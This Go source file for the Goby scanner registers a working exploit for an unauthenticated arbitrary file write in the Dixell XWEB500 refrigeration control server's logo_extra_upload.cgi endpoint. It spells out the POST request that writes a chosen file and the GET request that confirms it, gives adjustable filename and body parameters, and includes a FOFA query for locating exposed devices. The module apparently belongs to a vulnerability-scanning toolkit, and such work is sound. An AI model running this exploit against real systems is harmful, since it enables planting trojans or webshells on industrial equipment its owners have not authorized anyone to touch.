package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dixell XWEB500 logo_extra_upload.cgi Api Arbitrary File Write Vulnerability",
    "Description": "<p>Dixell XWEB500 is a small to medium network computer control and monitoring server suitable for managing industrial and commercial refrigeration systems.</p><p>Dixell XWEB500 has security vulnerabilities, unauthorized users can write arbitrary files and access, upload Trojan horses and other malicious behaviors.</p>",
    "Impact": "<p>Dixell XWEB500 Arbitrary File Write</p>",
    "Recommendation": "<p>Set access permissions, set whitelist</p><p>Keep an eye on the official website for updates: <a href=\"https://climate.emerson.com/\">https://climate.emerson.com/</a></p>",
    "Product": "Dixell XWEB500",
    "VulType": [
        "File Creation"
    ],
    "Tags": [
        "File Creation"
    ],
    "Translation": {
        "CN": {
            "Name": "Dixell XWEB500 系统 logo_extra_upload.cgi 接口任意文件写入漏洞",
            "Product": "Dixell XWEB500",
            "Description": "<p>Dixell XWEB500 是中小型网络计算机控制和监控服务器，适用于管理工业和商业制冷系统。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dixell XWEB500存在安全漏洞，未授权用户可写入任意文件并访问，上传木马等恶意行为。</span><br></p>",
            "Recommendation": "<p>设置访问权限、设置白名单</p><p>及时关注官网更新：<a href=\"https://climate.emerson.com/\">https://climate.emerson.com/</a></p>",
            "Impact": "<p>Dixell XWEB500存在安全漏洞，未授权用户可写入任意文件并访问，上传木马等恶意行为。<br></p>",
            "VulType": [
                "文件创建"
            ],
            "Tags": [
                "文件创建"
            ]
        },
        "EN": {
            "Name": "Dixell XWEB500 logo_extra_upload.cgi Api Arbitrary File Write Vulnerability",
            "Product": "Dixell XWEB500",
            "Description": "<p>Dixell XWEB500 is a small to medium network computer control and monitoring server suitable for managing industrial and commercial refrigeration systems.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Dixell XWEB500 has security vulnerabilities, unauthorized users can write arbitrary files and access, upload Trojan horses and other malicious behaviors.</span><br></p>",
            "Recommendation": "<p>Set access permissions, set whitelist</p><p>Keep an eye on the official website for updates: <a href=\"https://climate.emerson.com/\">https://climate.emerson.com/</a></p>",
            "Impact": "<p>Dixell XWEB500 Arbitrary File Write</p>",
            "VulType": [
                "File Creation"
            ],
            "Tags": [
                "File Creation"
            ]
        }
    },
    "FofaQuery": "body=\"/cgi-bin/xweb500.cgi\"",
    "GobyQuery": "body=\"/cgi-bin/xweb500.cgi\"",
    "Author": "abszse",
    "Homepage": "https://climate.emerson.com/en-de/shop/1/dixell-electronics-sku-xweb500-evo-en-gb",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/other/dixell-xweb500-filewrite.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "10",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/logo_extra_upload.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/octet-stream"
                },
                "data_type": "text",
                "data": "abszse.txt\ndixell-xweb500-filewrite"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/logo/abszse.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dixell-xweb500-filewrite",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/cgi-bin/logo_extra_upload.cgi",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/octet-stream"
                },
                "data_type": "text",
                "data": "abszse.txt\ndixell-xweb500-filewrite"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/logo/abszse.txt",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "dixell-xweb500-filewrite",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "123.txt",
            "show": ""
        },
        {
            "name": "filebody",
            "type": "input",
            "value": "dixell-xweb500-filewrite",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6874"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
